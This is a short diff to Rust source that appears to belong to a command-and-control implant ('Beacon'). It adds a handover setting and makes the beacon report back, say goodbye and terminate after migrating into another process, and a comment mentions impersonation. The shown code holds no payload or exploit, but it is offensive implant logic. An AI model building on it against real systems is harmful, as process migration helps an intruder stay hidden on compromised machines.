@@ -635,6 +635,7 @@ impl Beacon {
             agent_id: self.cfg.agent_id.clone(),
             server: self.cfg.server.clone(),
             verbose: self.cfg.verbose,
+            handover: self.cfg.handover(),
         }
     }
 
@@ -885,7 +886,16 @@ impl Beacon {
                 }
                 _ => {
                     let outcome = task::run(&self.context(), &kind, &args);
+                    // A migration that moves the implant out of its own
+                    // process asks the beacon to stop: the answer is sent
+                    // first, and the process that took over keeps the work.
+                    let leave = task::wants_exit(&outcome);
                     self.send_result(&id, outcome)?;
+                    if leave {
+                        self.send_bye()?;
+                        self.terminate("the implant moved into another process");
+                        return Ok(false);
+                    }
                 }
             }
             // A one-shot impersonation was meant for this task: the implant
